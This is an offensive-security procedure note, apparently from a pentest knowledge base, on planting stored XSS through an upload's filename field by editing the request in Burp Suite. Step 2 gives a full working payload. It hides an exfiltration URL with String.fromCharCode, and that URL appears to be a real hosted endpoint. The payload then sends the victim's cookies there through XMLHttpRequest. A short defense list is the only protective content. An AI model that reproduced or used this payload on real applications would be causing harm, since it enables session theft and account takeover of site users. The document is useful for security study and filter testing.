---
tags:
  - xss
  - payload-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Online-String-Tools]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0796fbde-67e4-4d96-b417-ac074f8d5814
created_at: '2025-12-14T00:11:25.256Z'
updated_at: '2025-12-14T00:11:25.256Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Modify Filename with XSS Payload

## Summary

This procedure modifies the filename parameter in an intercepted upload request to inject a stored XSS payload for later execution.

## Description

Using a proxy, the filename is altered to include JavaScript that executes on error, exfiltrating cookies to an attacker server. Obfuscation with ASCII codes is used to bypass basic filters.

## Requirements

1. Intercepted upload request
2. XSS payload prepared (possibly using string to ASCII conversion)
3. Proxy tool for request editing

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all filename inputs
- Implement strict input validation for special characters
- Log and alert on suspicious filename patterns

## Objectives

1. Store malicious JavaScript in the application
2. Enable blind execution without direct feedback
3. Facilitate data exfiltration

## Instructions

### Step 1: Prepare Payload

**Context**: Obfuscate the exfiltration URL.

Use [[tools/Online-String-Tools]] to convert the attacker's URL to ASCII codes.

> Creates obfuscated string like 104,116,116,112,115,58,47,47,...

### Step 2: Inject Payload into Filename

**Context**: Edit the intercepted request.

In Burp Suite, set filename to: \"><img src=1 onerror=\"url=String.fromCharCode(104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=new XMLHttpRequest();xhttp.open('GET',url,true);xhttp.send();\"".

> Forwards the modified request.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Online-String-Tools]]

## Tags

- xss
- payload-injection
